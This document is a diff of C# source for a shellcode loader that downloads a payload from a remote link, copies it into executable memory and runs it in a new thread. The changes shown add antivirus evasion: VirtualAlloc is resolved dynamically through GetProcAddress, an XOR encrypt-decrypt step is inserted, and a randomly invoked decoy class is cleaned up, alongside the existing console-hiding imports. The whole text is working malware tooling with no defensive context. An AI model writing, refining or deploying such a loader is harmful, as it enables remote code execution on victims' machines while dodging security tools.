@@ -2,7 +2,6 @@ using System;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Reflection;
-using System.Threading;
 
 class Program
 {
@@ -16,21 +15,49 @@ class Program
         WebClient wc = new WebClient();
         byte[] shellcode = wc.DownloadData("[DOWNLOAD_LINK]");
 
+        // Get VirtualAlloc address and create delegate
+        IntPtr kernel32 = LoadLibrary("kernel32.dll");
+        IntPtr virtualAllocAddr = GetProcAddress(kernel32, "VirtualAlloc");
+        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddr, typeof(VirtualAllocDelegate));
+
         // Allocate memory and copy shellcode
-        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        IntPtr allocatedMemory = virtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
         Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
 
-        // Create thread to execute shellcode
-        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
-        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+        // Encrypt the shellcode in memory
+        XorEncrypt(shellcode);
+
+        // Decrypt and execute shellcode
+        DecryptAndExecute(allocatedMemory, shellcode);
 
         // Call a random method to obfuscate further
-        CallRandomopMethod();
+        CallRandomMethod();
     }
 
-    static void CallRandomopMethod()
+    static void XorEncrypt(byte[] data, byte key = 0xAA)
     {
-        MethodInfo[] methods = typeof(BenigopnClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
+        for (int i = 0; i < data.Length; i++)
+        {
+            data[i] ^= key;
+        }
+    }
+
+    static void DecryptAndExecute(IntPtr allocatedMemory, byte[] shellcode)
+    {
+        // Decrypt the shellcode
+        XorEncrypt(shellcode);
+
+        // Copy decrypted shellcode to allocated memory
+        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
+
+        // Execute the shellcode
+        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+    }
+
+    static void CallRandomMethod()
+    {
+        MethodInfo[] methods = typeof(BenignClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
         Random rand = new Random();
         int index = rand.Next(methods.Length);
         methods[index].Invoke(null, null);
@@ -49,9 +76,6 @@ class Program
     private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
     [DllImport("kernel32.dll")]
-    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
-
-    [DllImport("kernel32.dll")]
     static extern IntPtr GetConsoleWindow();
 
     [DllImport("user32.dll")]
@@ -59,6 +83,8 @@ class Program
 
     private const int SW_HIDE = 0;
     private const int SW_SHOW = 5;
+
+    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
     [Flags]
     enum AllocationType
@@ -74,20 +100,20 @@ class Program
     }
 }
 
-class BenigopnClass
+class BenignClass
 {
-    public static void Methodexecuted1()
+    public static void Method1()
     {
-        Console.WriteLine("Method1 is efghfghgfhxecuted.");
+        Console.WriteLine("Method1 executed.");
     }
 
-    public static void Methodexecuted2()
+    public static void Method2()
     {
-        Console.WriteLine("Method2 are execfghfghuted.");
+        Console.WriteLine("Method2 executed.");
     }
 
-    public static void Methodexecuted3()
+    public static void Method3()
     {
-        Console.WriteLine("Method3 had exefghfghcuted.");
+        Console.WriteLine("Method3 executed.");
     }
 }
